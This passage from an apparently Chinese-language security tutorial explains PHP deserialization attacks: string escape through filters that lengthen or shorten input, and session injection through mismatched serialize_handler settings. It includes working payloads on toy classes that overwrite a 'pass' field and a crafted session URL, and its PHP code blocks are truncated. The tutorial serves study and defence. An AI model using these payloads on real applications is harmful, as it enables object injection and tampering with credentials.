```php
after filter:';
	echo $res;
	$c=unserialize($res);
	echo '';
	echo $c->pass;
?>
```
```
O:1:"A":2:{s:4:"name";s:3:"Bob";s:4:"pass";s:3:"123";}
after filter:
O:1:"A":2:{s:4:"name";s:3:"Bob";s:4:"pass";s:3:"123";}
123
```
以上代码限制了输入的内容 当输入 x 时会替换为 yy 若被替换则会出现报错,因为长度与字符实际长度不符
```php
after filter:';
	echo $res;
	$c=unserialize($res);
	echo '';
	echo $c->pass;
?>
```
```
O:1:"A":2:{s:4:"name";s:4:"Bobx";s:4:"pass";s:3:"123";}
after filter:
O:1:"A":2:{s:4:"name";s:4:"Bobyy";s:4:"pass";s:3:"123";}
Notice: unserialize(): Error at offset 31 of 56 bytes in \out.php on line 17
```
在只能修改 name 值的情况下,要将 pass 改为 456 则需要构造 `";s:4:"pass";s:3:"456";}` 其中有 24 个字符
由于在 `}` 以后的字符都不会影响反序列化, 所以可以填充内容在 `}` 之后
x 变为 yy 为原来的 2 倍长度 因此我们构造的 playload x 的数量应该为 24 当他变为原来的两倍 时 正好与没加倍时 name 的长度相同 便可以在后面构造 pass 的值
相应 payload
```
xxxxxxxxxxxxxxxxxxxxxxxx";s:4:"pass";s:3:"456";}
```
```php
after filter:';
echo $res;
$c=unserialize($res);
echo $c->pass;
?>
```
```
O:1:"A":2:{s:4:"name";s:48:"xxxxxxxxxxxxxxxxxxxxxxxx";s:4:"pass";s:3:"456";}";s:4:"pass";s:3:"123";}
after filter:
O:1:"A":2:{s:4:"name";s:48:"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";s:4:"pass";s:3:"456";}";s:4:"pass";s:3:"123";}
456
```
### 字符串变短
```php
after filter:';
	echo $res;
	$c=unserialize($res);
	echo '';
	echo $c->pass;
?>
```
```
O:1:"A":3:{s:4:"name";s:3:"Bob";s:4:"user";s:3:"bob";s:4:"pass";s:3:"123";}
after filter:
O:1:"A":3:{s:4:"name";s:3:"Bob";s:4:"user";s:3:"bob";s:4:"pass";s:3:"123";}
123
```
这里将 test 替换为空,
```php
after filter:';
	echo $res;
	$c=unserialize($res);
	echo '';
	echo $c->pass;
?>
```
```
O:1:"A":3:{s:4:"name";s:4:"test";s:4:"user";s:3:"bob";s:4:"pass";s:3:"123";}
after filter:
O:1:"A":3:{s:4:"name";s:4:"";s:4:"user";s:3:"bob";s:4:"pass";s:3:"123";}
Notice: unserialize(): Error at offset 31 of 72 bytes in \out_1.php on line 18
```
name 的内容为空 但是大小为 4
相当于我们要闭合掉 `";s:4:"user";s:3:"` 的内容
同样的,当仅 name 和 user 的值可控的情况下,需要通过 `";` 来构造闭合
相应 payload
```php
public $name='testtesttesttesttest';
public $user='a";s:4:"user";s:3:"bob";s:4:"pass";s:3:"456";}';
```
```php
after filter:';
	echo $res;
	$c=unserialize($res);
	echo '';
	echo $c->pass;
?>
```
```
O:1:"A":3:{s:4:"name";s:20:"testtesttesttesttest";s:4:"user";s:46:"a";s:4:"user";s:3:"bob";s:4:"pass";s:3:"456";}";s:4:"pass";s:3:"123";}
after filter:
O:1:"A":3:{s:4:"name";s:20:"";s:4:"user";s:46:"a";s:4:"user";s:3:"bob";s:4:"pass";s:3:"456";}";s:4:"pass";s:3:"123";}
456
```
---
## session反序列化
### 关于session
**session_start()**
当会话自动开始或者通过 `session_start()` 手动开始的时候，PHP 内部会依据客户端传来的 PHPSESSID 来获取现有的对应的会话数据（即 session 文件）， PHP 会自动反序列化 session 文件的内容，并将之填充到 `$_SESSION` 超级全局变量中。如果不存在对应的会话数据，则创建名为 `sess_PHPSESSID`(客户端传来的) 的文件。如果客户端未发送 PHPSESSID，则创建一个由 32 个字母组成的 PHPSESSID，并返回 set-cookie。
**存储机制**
php 中的 session 以文件的方式来存储的，存储方式就是由配置项 `session.save_handler` 来确定，默认是以文件的方式存储。
存储的文件是以 `sess_sessionid` 来进行命名的，文件的内容就是 session 值的序列话后的内容。
### 不同序列化处理器
**session.serialize_handler**
session.serialize_handler 定义用来序列化／解序列化的处理器名字。 当前支持 PHP 序列化格式 (名为 php_serialize)、 PHP PHP 内部格式 (名为 php 及 php_binary) 和 WDDX (名为 wddx)。
自 PHP 5.5.4 起可以使用 php_serialize。 php_serialize 在内部简单地直接使用 serialize/unserialize 函数，并且不会有 php 和 php_binary 所具有的限制。
```php
```
查看不同类型下序列化的字符串
```
php:            edd1e|s:3:"abc";
php_binary:     edd1es:3:"abc";
php_serialize:  a:1:{s:5:"edd1e";s:3:"abc";}
```
### session反序列化利用
Session 的实现没有问题，但 Session 序列化引擎配置使用不当就会造成利用
以 php_serialize 格式来存储，用 php 机制来读取
**存储session**
```php
# session.php
```
**读取session**
```php
# session_read.php
data;
		}
	}
?>
```
**生成playload**
```php
O:4:"test":1:{s:4:"data";s:4:"hack";}
```
将 playload 前面加上 `|` 输入到 session 里
```
/session.php?a=|O:4:"test":1:{s:4:"data";s:4:"hack";}
```
```php
array(1) {
  ["edd1e"]=>
  string(38) "|O:4:"test":1:{s:4:"data";s:4:"hack";}"
}
```
打开读取 session 页面输出构造的内容
![](../../../../../assets/img/Security/RedTeam/语言安全/PHP安全/PHP反序列化/5.png)
在 php 模式下 格式为键名＋竖线＋经过 serialize0 函数反序列处理的值
储存的 session 字符串为
```
a:1:{s:5:"edd1e";s:38:"|O:4:"test":1:{s:4:"data";s:4:"hack";}
```
反序列化的就是后面的字符串,所以成功输出
---
## POP
- [POP](./POP.md)